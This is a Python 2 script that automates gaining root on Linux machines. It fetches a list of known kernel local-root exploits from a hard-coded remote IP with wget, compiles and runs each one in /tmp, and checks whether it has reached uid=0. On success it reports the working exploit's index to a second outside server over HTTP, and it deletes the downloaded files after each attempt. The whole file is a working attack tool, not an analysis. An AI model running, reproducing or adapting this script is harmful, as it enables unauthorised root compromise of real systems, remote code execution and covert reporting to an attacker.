
from subprocess import *
import os
import urllib2

def isRoot(rootcomm):
    p = Popen('bash',stdin=PIPE,stdout=PIPE,shell=True)
    p.stdin.write('\n%s\n'%rootcomm)
    p.stdin.write('\nid\n')
    p.stdin.write('\nexit\n')
    p.stdin.write('\nexit\n')
    lout = p.communicate()[0]
    print lout
    return 'uid=0' in lout

rootexp =  [
            ('pwd','pwd'),
            ('wget http://31.220.49.247:15191/exp/2.6.32tx -O yxy;chmod 777 yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/2011LocalRootFor2.6.18-128.el5 -O yxy;chmod 777 yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/2632 -O yxy;chmod 777 yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/33516-3.1X.txt -O yxy.c;gcc yxy.c -lutil -lpthread -o yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/semtex.txt -O yxy.c;gcc -O2 yxy.c -o yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/vnik_v1_ubuntu.txt -O yxy.c;gcc -O2 yxy.c -o yxy','./yxy 0'),
            ('wget http://31.220.49.247:15191/exp/vnik_v1_ubuntu.txt -O yxy.c;gcc -O2 yxy.c -o yxy','./yxy 1'),
            ('wget http://31.220.49.247:15191/exp/vnik_v1_ubuntu.txt -O yxy.c;gcc -O2 yxy.c -o yxy','./yxy 2'),
            ('wget http://31.220.49.247:15191/exp/31347-3.4up.txt -O yxy.c;gcc yxy.c -o yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/timeoutpwn.txt -O yxy.c;gcc yxy.c -o yxy','./yxy'),
            ('wget http://31.220.49.247:15191/exp/mempodipper2.6.39-3.2.0.txt -O yxy.c;gcc yxy.c -o yxy','./yxy')
            
             ]
os.chdir('/tmp')
index = 0
for exp in rootexp:
    index = index + 1
    os.system(exp[0])
    if isRoot(exp[1]) :
        print 'ROOT!'
        urllib2.urlopen('http://211.87.234.117:81/i.php',str(index)).read()
        os.system('rm yxy*')
        exit()
    os.system('rm yxy*')
